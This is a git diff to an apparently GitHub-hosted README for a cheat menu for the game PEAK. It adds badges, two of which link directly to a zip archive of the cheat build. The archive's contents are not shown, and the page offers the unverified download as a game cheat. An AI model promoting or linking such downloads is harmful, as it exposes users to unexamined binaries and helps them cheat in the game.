@@ -1,5 +1,10 @@
 # PEAK Mod Menu / Cheat Hack 1.1
 
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.1/PEAK.Mod.Build.v1.1.zip)
+[![GitHub release](https://img.shields.io/badge/Release-1.1-blue?style=for-the-badge)](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.1/PEAK.Mod.Build.v1.1.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
+[![Stars](https://img.shields.io/github/stars/fuseloadercatalog/PEAK-cheatmenu?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-cheatmenu/stargazers)
+
 A feature-rich cheat for PEAK with a clean UI!
 
 Check out the Features list
